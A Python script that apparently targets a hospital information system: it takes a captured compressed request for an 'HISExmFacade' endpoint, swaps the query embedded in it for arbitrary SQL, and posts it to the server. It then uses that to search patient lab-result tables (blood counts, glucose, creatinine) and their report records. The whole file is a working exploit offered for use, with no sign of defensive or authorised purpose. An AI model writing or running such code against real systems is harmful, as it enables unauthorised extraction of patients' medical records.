from his_client_final import HISClient
import requests
import zlib
import re

class EXMFieldHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = EXMFieldHunter()

fields = ['WBC', 'HBO', 'HCT', 'GLUCOSE', 'CRE'] # HBO might be HB?

for f in fields:
    print(f"\nSearching EXMREPD for FIELDID='{f}'...")
    sql = f"SELECT * FROM OPDUSR.EXMREPD WHERE FIELDID='{f}' AND ROWNUM <= 5"
    res = hunter.execute_sql(sql)
    
    if res and "<NewDataSet>" in res:
        print(f"!!! FOUND {f} IN EXMREPD !!!")
        print(res[:2000])
        # If found, check EXAMREPORTID
        rpts = re.findall(r'<EXAMREPORTID>(.*?)</EXAMREPORTID>', res)
        if rpts:
            target = rpts[0]
            print(f"Checking Master for Report {target}...")
            q_mst = f"SELECT * FROM OPDUSR.EXMRPTM WHERE PFKEY='{target}'" # Assuming PFKEY links? Or REPORTTEMPID?
            # Schema said EXMREPD has EXAMREPORTID.
            # EXMRPTM has PFKEY?
            # Let's try matching EXAMREPORTID to PFKEY
            res_mst = hunter.execute_sql(q_mst)
            if res_mst and "<NewDataSet>" in res_mst:
                print("!!! FOUND MASTER !!!")
                print(res_mst[:2000])
    else:
        print(f"[-] No data for {f}")
